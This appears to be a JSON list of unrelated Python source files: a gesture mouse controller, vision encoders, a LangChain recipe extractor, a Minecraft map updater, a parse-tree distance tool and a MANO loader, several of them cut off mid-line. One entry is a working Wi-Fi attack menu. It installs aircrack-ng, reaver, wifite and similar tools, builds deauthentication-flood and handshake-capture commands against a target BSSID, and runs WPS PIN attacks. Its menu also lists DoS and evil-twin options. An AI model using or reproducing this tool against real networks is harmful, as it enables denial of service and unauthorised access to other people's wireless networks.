\r\n\r\n                # tracking the position of the index finger and pointer \r\n\r\n                if id == 8:                    # 8 is the position value of the index finger the index finger is used to track the movement of the pointer \r\n                    cv2.circle(img=frame, center=(x,y), radius=10, color=(0, 255, 255)) # we are drawing a cirlce to showcase the position of the top most part of the indrex finger \r\n                    index_x = screen_width/frame_width*x # adjusting the size of the x axis to the whole screen \r\n                    index_y = screen_height/frame_height*y # adjusting the size of the y axis to the whole screen \r\n                    pyautogui.moveTo(index_x, index_y) # initializing the pyautogui module to move the pointer according to the position of the index finger\r\n\r\n                # tracking the position of the thumb to do the click action \r\n\r\n                if id == 4:                     # 4 is the position value of the thumb finger and is used to replicate the action of a click\r\n                    cv2.circle(img=frame, center=(x,y), radius=10, color=(0, 255, 255)) # drawingf a circle aroung the thump finger \r\n                    thumb_x = screen_width/frame_width*x # adjusting the size of the x axis of the thumb \r\n                    thumb_y = screen_height/frame_height*y #adjusting the size of the y axis of the thumb\r\n                    print('diff',abs(index_y - thumb_y))  # an erorr handling statement to check the difference between the thumb and the index finger \r\n                    if abs(index_y - thumb_y) < 20: # if the difference between the index and thumb is below 20 position value then it replicates the click action\r\n                        print(\"click\") # prints statment to show click whenever a clcik is activated by the system \r\n                        pyautogui.clic",
    "import copy\nimport math\nfrom functools import partial\n\nimport numpy as np\nimport torch\nimport torch.nn as nn\nfrom timm.models import register_model\n\nfrom timm.models.layers import to_2tuple, trunc_normal_\nfrom networks.decoder import SUnetDecoder, Block\nimport timm\n\n\nclass OverlapPatchEmbed(nn.Module):\n    \"\"\" Image to Patch Embedding\n    \"\"\"\n\n    def __init__(self, img_size=224, patch_size=7, stride=4, in_chans=3, embed_dim=768):\n        super().__init__()\n\n        img_size = to_2tuple(img_size)\n        patch_size = to_2tuple(patch_size)\n\n        assert max(patch_size) > stride, \"Set larger patch_size than stride\"\n\n        self.img_size = img_size\n        self.patch_size = patch_size\n        self.H, self.W = img_size[0] // stride, img_size[1] // stride\n        self.num_patches = self.H * self.W\n        self.proj = nn.Conv2d(in_chans, embed_dim, kernel_size=patch_size, stride=stride,\n                              padding=(patch_size[0] // 2, patch_size[1] // 2))\n        self.norm = nn.LayerNorm(embed_dim)\n\n        self.apply(self._init_weights)\n\n    def _init_weights(self, m):\n        if isinstance(m, nn.Linear):\n            trunc_normal_(m.weight, std=.02)\n            if isinstance(m, nn.Linear) and m.bias is not None:\n                nn.init.constant_(m.bias, 0)\n        elif isinstance(m, nn.LayerNorm):\n            nn.init.constant_(m.bias, 0)\n            nn.init.constant_(m.weight, 1.0)\n        elif isinstance(m, nn.Conv2d):\n            fan_out = m.kernel_size[0] * m.kernel_size[1] * m.out_channels\n            fan_out //= m.groups\n            m.weight.data.normal_(0, math.sqrt(2.0 / fan_out))\n            if m.bias is not None:\n                m.bias.data.zero_()\n\n    def forward(self, x):\n        x = self.proj(x)\n        _, _, H, W = x.shape\n        x = x.flatten(2).transpose(1, 2)\n        x = self.norm(x)\n\n        return x, H, W\n\nclass SUnetEncoder(nn.Module):\n    def __init__(self, img_size=224, patch_size=16, in_chans=3, num_classes=9, embed_dims=[64, 128, 320, 512],\n                 num_heads=[1, 2, 5, 8], mlp_ratios=[8, 8, 4, 4], qkv_bias=False, qk_scale=None, drop_rate=0.,\n                 attn_drop_rate=0., drop_path_rate=0., norm_layer=nn.LayerNorm, depths=[2, 2, 2, 2],\n                 sr_ratios=[8, 4, 2, 1], num_stages=4, linear=False, dpr=None):\n        super().__init__()\n        cur = 0\n        self.num_stages = num_stages\n\n        for i in range(num_stages):\n            patch_embed = OverlapPatchEmbed(img_size=img_size if i == 0 else img_size // (2 ** (i + 1)),\n                                            patch_size=7 if i == 0 else 3,\n                                            stride=4 if i == 0 else 2,\n                                            in_chans=in_chans if i == 0 else embed_dims[i - 1],\n                                            embed_dim=embed_dims[i])\n\n            block = nn.ModuleList([Block(\n                dim=embed_dims[i], num_heads=num_heads[i], mlp_ratio=mlp_ratios[i], qkv_bias=qkv_bias,\n                qk_scale=qk_scale,\n                drop=drop_rate, attn_drop=attn_drop_rate, drop_path=dpr[cur + j], norm_layer=norm_layer,\n                sr_ratio=sr_ratios[i], linear=linear)\n                for j in range(depths[i])])\n            norm = norm_layer(embed_dims[i])\n            cur += depths[i]\n\n            setattr(self, f\"patch_embed{i + 1}\", patch_embed)\n            setattr(self, f\"block{i + 1}\", block)\n            setattr(self, f\"norm{i + 1}\", norm)\n\n        self.apply(self._init_weights)\n\n    def _init_weights(self, m):\n        if isinstance(m, nn.Linear):\n            trunc_normal_(m.weight, std=.02)\n            if isinstance(m, nn.Linear) and m.bias is not None:\n                nn.init.constant_(m.bias, 0)\n        elif isinstance(m, nn.LayerNorm):\n            nn.init.constant_(m.bias, 0)\n            nn.init.constant_(m.weight, 1.0)\n        elif isinstance(m, nn.Conv2d):\n            fan_out = m.kernel_size[0] * m.kernel_size[1] * m.out_channels\n            fan_out //= m.groups\n            m.weight.data.normal_(0, math.sqrt(2.0 / fan_out))\n            if m.bias is not None:\n                m.bias.data.zero_()\n    def forward_features(self, x):\n        B = x.shape[0]\n        skips = []\n        for i in range(self.num_stages):\n            patch_embed = getattr(self, f\"patch_embed{i + 1}\")\n            block = getattr(self, f\"block{i + 1}\")\n            norm = getattr(self, f\"norm{i + 1}\")\n            x, H, W = patch_embed(x)\n            for blk in block:\n                x = blk(x, H, W)\n\n            x = norm(x)\n\n            x = x.reshape(B, H, W, -1).permute(0, 3, 1, 2).contiguous()\n            if i < self.num_stages - 1:\n                skips.append(x)\n        return x, skips\n\n    def forward(self, x):\n        x, skips = self.forward_features(x)\n        return x, skips\nclass SegmentationHead(nn.Sequential):\n\n    def __init__(self, in_channels, out_channels, kernel_size=3, upsampling=1):\n        conv2d = nn.Conv2d(in_channels, out_channels, kernel_size=kernel_size, paddin",
    "from langchain_experimental.llms.ollama_functions import OllamaFunctions\nfrom langchain.chains import create_extraction_chain\nimport json\nfrom langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder\nfrom langchain_core.pydantic_v1 import BaseModel, Field\nfrom langchain_community.document_loaders import PyMuPDFLoader\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\n\n\nprompt =ChatPromptTemplate.from_messages(\n    [\n        (\n            \"system\",\n            \"You are a top-tier algorithm for extracting information from text. \"\n            \"Only extract information that is relevant to the provided text. \"\n            \"If no information is relevant, use the schema and output \"\n            \"an empty list where appropriate.\"\n        ),\n        (\"user\",\n            \"I need to extract information from \"\n            \"the following text: ```\\n{text}\\n```\\n\",\n        ),\n    ]\n)\n# Schema\nschema = {\n  \"type\": \"object\",\n  \"title\": \"Recipe Information Extractor\",\n  \"$schema\": \"http://json-schema.org/draft-07/schema#\",\n  \"required\": [\n    \"recipes\"\n  ],\n  \"properties\": {\n    \"recipes\": {\n      \"type\": \"array\",\n      \"items\": {\n        \"type\": \"object\",\n        \"required\": [\n          \"name\",\n          \"ingredients\"\n        ],\n        \"properties\": {\n          \"name\": {\n            \"type\": \"string\",\n            \"description\": \"The name of the recipe.\"\n          },\n          \"ingredients\": {\n            \"type\": \"array\",\n            \"items\": {\n              \"type\": \"object\",\n              \"required\": [\n                \"name\",\n                \"amount\",\n                \"unit\"\n              ],\n              \"properties\": {\n                \"name\": {\n                  \"type\": \"string\",\n                  \"description\": \"The name of the ingredient.\"\n                },\n                \"unit\": {\n                  \"type\": \"string\",\n                  \"description\": \"The unit of the amount of the ingredient.\"\n                },\n                \"amount\": {\n                  \"type\": \"number\",\n                  \"description\": \"The numeric amount of the ingredient.\"\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  },\n  \"description\": \"Schema for extracting recipe information from text.\"\n}\n\nloader = PyMuPDFLoader(\"./recipe.pdf\")\ndocs = loader.load()\n\ndef split_docs(documents, chunk_size=int(128_000 * 0.8), chunk_overlap=20):\n    \n    # Initializing the RecursiveCharacterTextSplitter with\n    # chunk_size and chunk_overlap\n    text_splitter = RecursiveCharacterTextSplitter(\n        chunk_size=chunk_size,\n        chunk_overlap=chunk_overlap\n    )\n    \n    # Splitting the documents into chunks\n    chunks = text_splitter.split_documents(documents=documents)\n    \n    # returning the document chunks\n    return chunks\ndocuments = split_docs(documents=docs)\n# Run chain\nllm = OllamaFunctions(model=\"mistral:7b-instruct\", temperature=0)\nchain = prompt | create_extraction_chain(schema, llm)\nresponses = []\nfor document in documents:\n  input_data = {\n          \"text\": document,\n          \"json_schema\": schema,  \n          \"instruction\": (\n              \"recipe.each recipe has a name and list of ingredients.ingredients should have a name,numeric amount,and unit of amount\"\n          )\n      }\n  response = chain.invoke(input_data)\n  responses.append(response)\nfor response in responses:\n    result = response['text']\n    print(json.dumps(result, indent=4))",
    "# Easy Map Updater\n# Copyright (C) 2024  Jesse Spicer, and StickyPiston Hosting\n\n\n\n# Import things\n\nimport os\nimport shutil\nimport json\nfrom nbt import nbt as NBT\nfrom pathlib import Path\nfrom lib.log import log\nfrom lib.data_pack_files import command\nfrom lib.data_pack_files import advancement\nfrom lib.data_pack_files import predicate\nfrom lib.data_pack_files import loot_table\nfrom lib.data_pack_files import item_modifier\nfrom lib.data_pack_files import mcfunction\nfrom lib.data_pack_files import tags\nfrom lib import finalize\nfrom lib import json_manager\nfrom lib import defaults\nfrom lib import utils\n\n\n\n# Initialize variables\n\npack_version = defaults.PACK_VERSION\nPACK_FORMAT = defaults.DATA_PACK_FORMAT\n\n\n\n# Define functions\n\ndef update(world: Path, version: int):\n    log(\"Updating data packs\")\n\n    # Set original path\n    og_world = world.parent / f'{world.name} - Original'\n\n    # Set pack version\n    global pack_version\n    pack_version = version\n\n    # Check for errors\n    if not world.exists():\n        log(\"ERROR: World does not exist!\")\n        return\n    if not og_world.exists():\n        log(\"ERROR: Original copy of world doesn't exist, prepare it!\")\n        return\n    if not (world / \"datapacks\").exists():\n        log(\"ERROR: World has no data packs!\")\n        return\n    if not (og_world / \"datapacks\").exists():\n        log(\"ERROR: Original copy of world has no data packs!\")\n        return\n\n    # Update data packs\n    for data_pack in (og_world / \"datapacks\").iterdir():\n        if data_pack.is_file():\n            continue\n        update_data_pack(\n            world / \"datapacks\" / data_pack.name,\n            og_world / \"datapacks\" / data_pack.name,\n            data_pack.name\n        )\n\n    # Log completion\n    log(\"Data packs updated\")\n\n\n\ndef update_data_pack(pack: Path, og_pack: Path, data_pack: str):\n    log(f\"Updating {data_pack}\")\n\n    pack.mkdir(exist_ok=True, parents=True)\n    update_pack_mcmeta(pack, og_pack)\n    update_namespaces(pack, og_pack)\n\n\n\ndef update_pack_mcmeta(pack: Path, og_pack: Path):\n    # Skip if the original pack.mcmeta does not exist\n    if not (og_pack / \"pack.mcmeta\").exists():\n        return\n\n    # Modify contents of pack.mcmeta\n    contents, load_bool = json_manager.safe_load(og_pack / \"pack.mcmeta\")\n    if not load_bool:\n        return\n    if contents[\"pack\"][\"pack_format\"] < PACK_FORMAT:\n        contents[\"pack\"][\"pack_format\"] = PACK_FORMAT\n    with (pack / \"pack.mcmeta\").open(\"w\", encoding=\"utf-8\", newline=\"\\n\") as file:\n        json.dump(contents, file, indent=4)\n\n\n\ndef update_namespaces(pack: Path, og_pack: Path):\n    # Skip if the data folder does not exist\n    if not (og_pack / \"data\").exists():\n        return\n\n    # Iterate through namespaces\n    for namespace in (og_pack / \"data\").iterdir():\n        # Skip if not a folder\n        if not namespace.is_dir():\n            continue\n\n        # Update functions\n        folder = pack / \"data\" / namespace.name / \"functions\"\n        og_folder = namespace / \"functions\"\n        if og_folder.exists():\n            update_functions(folder, og_folder, namespace.name)\n\n        # Update advancements\n        folder = pack / \"data\" / namespace.name / \"advancements\"\n        og_folder = namespace / \"advancements\"\n        if og_folder.exists():\n            update_advancements(folder, og_folder)\n\n        # Update predicates\n        folder = pack / \"data\" / namespace.name / \"predicates\"\n        og_folder = namespace / \"predicates\"\n        if og_folder.exists():\n            update_predicates(folder, og_folder)\n\n        # Update loot tables\n        folder = pack / \"data\" / namespace.name / \"loot_tables\"\n        og_folder = namespace / \"loot_tables\"\n        if og_folder.exists():\n            update_loot_tables(folder, og_folder)\n\n        # Update item modifiers\n        folder = pack / \"data\" / namespace.name / \"item_modifiers\"\n        og_folder = namespace / \"item_modifiers\"\n        if og_folder.exists():\n            update_item_modifiers(folder, og_folder)\n\n        # Update block tags\n        folder = pack / \"data\" / namespace.name / \"tags\" / \"blocks\"\n        og_folder = namespace / \"tags\" / \"blocks\"\n        if og_folder.exists():\n            update_tags(folder, og_folder, \"blocks\")\n\n        # Update item tags\n        folder = pack / \"data\" / namespace.name / \"tags\" / \"items\"\n        og_folder = namespace / \"tags\" / \"items\"\n        if og_folder.exists():\n            update_tags(folder, og_folder, \"items\")\n\n\n\ndef update_functions(folder: Path, og_folder: Path, namespace: str):\n    for og_file_path in og_folder.glob(\"**/*.mcfunction\"):\n        pack_subdir = og_file_path.as_posix()[len(og_folder.as_posix()) + 1:]\n        file_path = folder / pack_subdir\n        mcfunction.update(file_path, og_file_path, pack_version, namespace + \":\" + pack_subdir.split(\".\")[0].replace(\"\\\\\", \"/\"))\n\n\n\ndef update_advancements(folder: Path, og_folder: Path):\n    for og_file_path in og_folder.glob(\"**/*.json\"):\n        pack_subdir = og_file_path.as_posix()[len(og_f",
    "import re\nfrom typing import Union\nimport stanza\nimport nltk\nfrom nltk.tree import Tree as NLTKTree\nfrom nltk.draw.util import CanvasFrame\nfrom nltk.draw import TreeWidget\nfrom apted import APTED, Config\nfrom apted.helpers import Tree as APTEDTree\n\nclass TreeEditDistanceCalculator:\n    \"\"\"\n    A class for calculating the Tree Edit Distance (TED) between sentences, along with utilities for parsing\n    and visualizing constituency trees.\n    \n    Attributes:\n    language (str): The language configuration for the stanza NLP pipeline.\n    \"\"\"\n\n    def __init__(self, language: str = 'en'):\n        \"\"\"\n        Initializes the TreeEditDistanceCalculator with a specified language for the NLP pipeline.\n        \n        Args:\n        language (str): The language code to be used by the stanza pipeline for parsing sentences.\n        \"\"\"\n        self.nlp = stanza.Pipeline(lang=language, processors='tokenize,pos,constituency', use_gpu=True)\n    \n    def get_constituency_tree(self, sentence: str) -> NLTKTree:\n        \"\"\"\n        Parses a sentence and returns its constituency tree.\n        \n        Args:\n        sentence (str): The sentence to parse.\n        \n        Returns:\n        NLTKTree: The constituency tree of the parsed sentence.\n        \"\"\"\n        doc = self.nlp(sentence)\n        nltk_tree = doc.sentences[0].constituency\n        return nltk_tree\n\n    def remove_non_terminal_labels(self, tree_string: str) -> str:\n        \"\"\"\n        Removes non-terminal labels from a tree string to simplify comparison.\n        \n        Args:\n        tree_string (str): The string representation of a tree.\n        \n        Returns:\n        str: A cleaned tree string without non-terminal labels.\n        \"\"\"\n        cleaned_tree_string = re.sub(r'\\([A-Z$]+ ', '(', tree_string)\n        cleaned_tree_string = re.sub(r'\\s+', '', cleaned_tree_string)\n        return cleaned_tree_string\n\n    def nltk_tree_to_bracket_string(self, tree: NLTKTree) -> str:\n        \"\"\"\n        Converts an NLTK tree to a full bracket string representation.\n        \n        Args:\n        tree (NLTKTree): The NLTK tree to convert.\n        \n        Returns:\n        str: The bracket string representation of the tree.\n        \"\"\"\n        tree_string = str(tree)\n        cleaned_tree_string = self.remove_non_terminal_labels(tree_string)\n        bracket_string = cleaned_tree_string.replace(\")\", \"}\").replace(\"(\", \"{\")\n        return bracket_string\n    \n    def nltk_tree_to_n_bracket_string(self, tree, max_depth=None, current_depth=0):\n        \"\"\"\n        Converts an NLTK tree to a bracket string with an optional depth limitation.\n        \n        Args:\n        tree: The NLTK tree to convert.\n        max_depth (Optional[int]): The maximum depth to include in the conversion.\n        current_depth (int): The current depth in the recursion (used internally).\n        \n        Returns:\n        str: The bracket string representation of the tree with limited depth.\n        \"\"\"\n        if max_depth is not None and current_depth > max_depth or not tree:\n            return \"\"\n\n        tree_string = \"(\" + tree.label() + \" \"\n        if tree.height() > 2:\n            for child in tree:\n                tree_string += self.nltk_tree_to_n_bracket_string(child, max_depth, current_depth + 1)\n        else:\n            tree_string += \" \".join(tree.leaves())\n        tree_string += \")\"\n        return tree_string\n    \n    def clean_string(self, tree_string: str) -> str:\n        \"\"\"\n        Cleans and transforms a tree string to a specific bracket format.\n        \n        Args:\n        tree_string (str): The tree string to clean.\n        \n        Returns:\n        str: The cleaned and formatted tree string.\n        \"\"\"\n        cleaned_tree_string = self.remove_non_terminal_labels(tree_string)\n        bracket_string = cleaned_tree_string.replace(\")\", \"}\").replace(\"(\", \"{\")\n        return bracket_string\n\n    def get_bracketed_string(self, sentence: str) -> str:\n        \"\"\"\n        Gets the bracket string representation of a sentence's constituency tree.\n        \n        Args:\n        sentence (str): The sentence to process.\n        \n        Returns:\n        str: The bracket string representation of the constituency tree.\n        \"\"\"\n        tree = self.get_constituency_tree(sentence)\n        return self.nltk_tree_to_bracket_string(tree)\n\n    def get_nltk_tree(self, sentence: str) -> NLTKTree:\n        \"\"\"\n        Gets the NLTK tree representation of a sentence's constituency tree.\n        \n        Args:\n        sentence (str): The sentence to process.\n        \n        Returns:\n        NLTKTree: The NLTK tree of the constituency tree.\n        \"\"\"\n        return self.get_constituency_tree(sentence)\n\n    def draw_and_save_tree(self, sentence: str, filepath: str):\n        \"\"\"\n        Draws the constituency tree of a sentence and saves it to a file.\n        \n        Args:\n        sentence (str): The sentence to process.\n        filepath (str): The path to the file where the tree visualization will be save",
    "#!/usr/bin/env python3\nimport os\nimport subprocess\nfrom subprocess import check_call\nprint(\"\\nInstalling Needed Tools\")\nprint(\"\\n\")\ncmd0 = os.system(\"apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite bettercap wifipumpkin3\")\ncmd  = os.system(\"sleep 3 && clear\")\ndef intro():\n    cmd  = os.system(\"clear\")\n    print(\"\"\"\\033[1;25m\n\n\n   \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588    \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2584\u2584\u2584\u2584       \u2588\u2588\u2588      \u2584\u2588  \u2588\u2588\u2588\u2584\u2584\u2584\u2584      \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2584\u2588              \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2584\u2588\u2588   \u2584      \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \n  \u2588\u2588\u2588    \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588\u2580\u2580\u2580\u2588\u2588\u2584 \u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584 \u2588\u2588\u2588  \u2588\u2588\u2588\u2580\u2580\u2580\u2588\u2588\u2584   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588             \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588   \u2588\u2588\u2584   \u2588\u2588\u2588    \u2588\u2588\u2588 \n  \u2588\u2588\u2588    \u2588\u2580    \u2588\u2588\u2588    \u2588\u2580  \u2588\u2588\u2588   \u2588\u2588\u2588    \u2580\u2588\u2588\u2588\u2580\u2580\u2588\u2588 \u2588\u2588\u2588\u258c \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2580  \u2588\u2588\u2588             \u2588\u2588\u2588    \u2588\u2580  \u2588\u2588\u2588\u2584\u2584\u2584\u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2580  \n  \u2588\u2588\u2588         \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588   \u2580 \u2588\u2588\u2588\u258c \u2588\u2588\u2588   \u2588\u2588\u2588  \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \u2588\u2588\u2588            \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \u2580\u2580\u2580\u2580\u2580\u2580\u2588\u2588\u2588  \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \n\u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588     \u2588\u2588\u2588\u258c \u2588\u2588\u2588   \u2588\u2588\u2588 \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \u2588\u2588\u2588           \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \u2584\u2588\u2588   \u2588\u2588\u2588 \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \n         \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2584  \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588     \u2588\u2588\u2588  \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2584  \u2588\u2588\u2588             \u2588\u2588\u2588    \u2588\u2584  \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2584  \n   \u2584\u2588    \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588     \u2588\u2588\u2588  \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588\u258c    \u2584       \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \n \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2580\u2588   \u2588\u2580     \u2584\u2588\u2588\u2588\u2588\u2580   \u2588\u2580    \u2580\u2588   \u2588\u2580    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2584\u2584\u2588\u2588       \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2580\u2588\u2588\u2588\u2588\u2588\u2580    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \n                                                                            \u2580                                                                                                                                                      \nAuthors  : AKASH|ASWIN|SUDEV|SARATH\n-------------------------------------------------------------------------  \n(1)Start monitor mode       \n(2)Stop monitor mode\n(3)Scan Networks                            \n(4)Getting Handshake(monitor mode needed)                                       \n(5)WPS Networks attacks (Bssid,monitor mode needed)\n(6)Scan for WPS Networks\n(7)DOS Attacks\n(8)Captive Portal\n(9)Evil Twin\n(10)Advanced Monitoring\n\n(0)About Our Team\n(00)Exit\n----------------------------------------------------------------------- \"\"\")\n    print(\"\\nEnter your choise here : !# \")\n    var = int(input(\"\"))\n    if var == 1 :\n        print(\"\\nEnter the interface:(Default(wlan0/wlan1))\")\n        interface = input(\"\")\n        order = \"airmon-ng start {} && airmon-ng check kill\".format(interface)\n        geny  = os.system(order)\n        intro()\n    elif var == 2 :\n        print(\"\\nEnter the interface:(Default(wlan0mon/wlan1mon))\")\n        interface = input(\"\")\n        order = \"airmon-ng stop {} && service network-manager restart\".format(interface)\n        geny  = os.system(order)\n        intro()\n    elif var == 3 :\n        print(\"\\nEnter the interface:(Default >> (wlan0mon/wlan1mon))\")\n        interface = input(\"\")\n        order = \"airodump-ng {} -M\".format(interface)\n        print(\"When Done Press CTRL+c\")\n        cmd = os.system(\"sleep 3\")\n        geny  = os.system(order)\n        cmd = os.system(\"sleep 10\")\n        intro()\n    \n    elif var == 4 :\n        print(\"\\nEnter the interface:(Default >>(wlan0mon/wlan1mon))\")\n        interface = input(\"\")\n        order     = \"airodump-ng {} -M\".format(interface)\n        print(\"\\nWhen Done Press CTRL+c\")\n        print(\"\\nNote: Under Probe it might be Passwords So copy them to the worlist file\")\n        print(\"\\nDon't Attack The Network if its Data is ZERO (you waste your time)\")\n        print(\"\\nyou Can use 's' to arrange networks\")\n        cmd       = os.system(\"sleep 7\")\n        geny      = os.system(order)\n        print(\"\\nEnter the bssid of the target?\")\n        bssid     = str(input(\"\"))\n        print(\"\\nEnter the channel of the network?\")\n        channel   = int(input())\n        print(\"Enter the path of the output file ?\")\n        path = str(input(\"\"))\n        print(\"\\nEnter the number of the packets [1-10000] ( 0 for unlimited number)\")\n        print(\"the number of the packets Depends on the Distance Between you and the network\")\n        dist = int(input(\"\"))\n        order = \"airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}\".format(interface,bssid,channel,path,dist,bssid,interface)\n        geny = os.system(order)\n        intro()\n    elif var == 0 :\n    \n        cmd = os.system(\"clear\")\n        print(\"\"\"\nHi.\nThis is Our Team\n\"\"\")\n        quit()\n    elif var == 00:\n        exit()    \n        \n    elif var == 5:\n        cmd = os.system(\"clear\")\n        print(\"\"\"\n1)Reaver\n2)Bully\n3)wifite (Recommeneded)\n4)PixieWps\n5)wp3 \n0) Back to Main Menu\n\"\"\")\n        print(\"Choose the kind of the attack(External WIFI Adapter Require) ?\")\n        attack = int(input(\"\"))\n        if attack == 1:\n            print(\"\\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon))\")\n            interface = str(input(\"\"))\n            print(\"\\nEnter the bssid of the network ?\")\n            bssid = str(input(\"\"))\n            order = (\"reaver -i {} -b {} -vv\").format(interface,bssid)\n        ",
    "import re\nimport torch.nn as nn\n\nfrom pretrainedmodels.models.xception import pretrained_settings\nfrom pretrainedmodels.models.xception import Xception\n\nfrom ._base import EncoderMixin\n\n\nclass XceptionEncoder(Xception, EncoderMixin):\n    def __init__(self, out_channels, *args, depth=5, **kwargs):\n        super().__init__(*args, **kwargs)\n\n        self._out_channels = out_channels\n        self._depth = depth\n        self._in_channels = 3\n\n        # modify padding to maintain output shape\n        self.conv1.padding = (1, 1)\n        self.conv2.padding = (1, 1)\n\n        del self.fc\n\n    def make_dilated(self, *args, **kwargs):\n        raise ValueError(\n            \"Xception encoder does not support dilated mode \" \"due to pooling operation for downsampling!\"\n        )\n\n    def get_stages(self):\n        return [\n            nn.Identity(),\n            nn.Sequential(self.conv1, self.bn1, self.relu, self.conv2, self.bn2, self.relu),\n            self.block1,\n            self.block2,\n            nn.Sequential(\n                self.block3,\n                self.block4,\n                self.block5,\n                self.block6,\n                self.block7,\n                self.block8,\n                self.block9,\n                self.block10,\n                self.block11,\n            ),\n            nn.Sequential(self.block12, self.conv3, self.bn3, self.relu, self.conv4, self.bn4),\n        ]\n\n    def forward(self, x):\n        stages = self.get_stages()\n\n        features = []\n        for i in range(self._depth + 1):\n            x = stages[i](x)\n            features.append(x)\n\n        return features\n\n    def load_state_dict(self, state_dict):\n        # remove linear\n        state_dict.pop(\"fc.bias\", None)\n        state_dict.pop(\"fc.weight\", None)\n\n        super().load_state_dict(state_dict)\n\n\nxception_encoders = {\n    \"xception\": {\n        \"encoder\": XceptionEncoder,\n        \"pretrained_settings\": pretrained_settings[\"xception\"],\n        \"params\": {\n            \"out_channels\": (3, 64, 128, 256, 728, 2048),\n        },\n    },\n}\n",
    "'''\nCopyright 2017 Javier Romero, Dimitrios Tzionas, Michael J Black and the Max Planck Gesellschaft.  All rights reserved.\nThis software is provided for research purposes only.\nBy using this software you agree to the terms of the MANO/SMPL+H Model license here http://mano.is.tue.mpg.de/license\n\nMore information about MANO/SMPL+H is available at http://mano.is.tue.mpg.de.\nFor comments or questions, please email us at: mano@tue.mpg.de\n\n\nAbout this file:\n================\nThis file defines a wrapper for the loading functions of the MANO model.\n\nModules included:\n- load_model:\n  loads the MANO model from a given file location (i.e. a .pkl file location),\n  or a dictionary object.\n\n'''\n\n\n__all__ = ['load_model', 'save_model']\n\nimport numpy as np\nimport pickle\nimport chumpy as ch\nfrom chumpy.ch import MatVecMult\nfrom .posemapper import posemap\nfrom .verts import verts_core\n\ndef ready_arguments(fname_or_dict):\n\n    if not isinstance(fname_or_dict, dict):\n        dd = pickle.load(open(fname_or_dict, 'rb'), encoding='latin1')\n    else:\n        dd = fname_or_dict\n\n    backwards_compatibility_replacements(dd)\n\n    want_shapemodel = 'shapedirs' in dd\n    nposeparms = dd['kintree_table'].shape[1] * 3\n\n    if 'trans' not in dd:\n        dd['trans'] = np.zeros(3)\n    if 'pose' not in dd:\n        dd['pose'] = np.zeros(nposeparms)\n    if 'shapedirs' in dd and 'betas' not in dd:\n        dd['betas'] = np.zeros(dd['shapedirs'].shape[-1])\n\n    for s in [\n            'v_template', 'weights', 'posedirs', 'pose', 'trans', 'shapedirs',\n            'betas', 'J'\n    ]:\n        if (s in dd) and not hasattr(dd[s], 'dterms'):\n            dd[s] = ch.array(dd[s])\n\n    if want_shapemodel:\n        dd['v_shaped'] = dd['shapedirs'].dot(dd['betas']) + dd['v_template']\n        v_shaped = dd['v_shaped']\n        J_tmpx = MatVecMult(dd['J_regressor'], v_shaped[:, 0])\n        J_tmpy = MatVecMult(dd['J_regressor'], v_shaped[:, 1])\n        J_tmpz = MatVecMult(dd['J_regressor'], v_shaped[:, 2])\n        dd['J'] = ch.vstack((J_tmpx, J_tmpy, J_tmpz)).T\n        dd['v_posed'] = v_shaped + dd['posedirs'].dot(\n            posemap(dd['bs_type'])(dd['pose']))\n    else:\n        dd['v_posed'] = dd['v_template'] + dd['posedirs'].dot(\n            posemap(dd['bs_type'])(dd['pose']))\n\n    return dd\n\n\ndef load_model(fname_or_dict):\n    dd = ready_arguments(fname_or_dict)\n\n    args = {\n        'pose': dd['pose'],\n        'v': dd['v_posed'],\n        'J': dd['J'],\n        'weights': dd['weights'],\n        'kintree_table': dd['kintree_table'],\n        'xp': ch,\n        'want_Jtr': True,\n        'bs_style': dd['bs_style']\n    }\n\n    result, 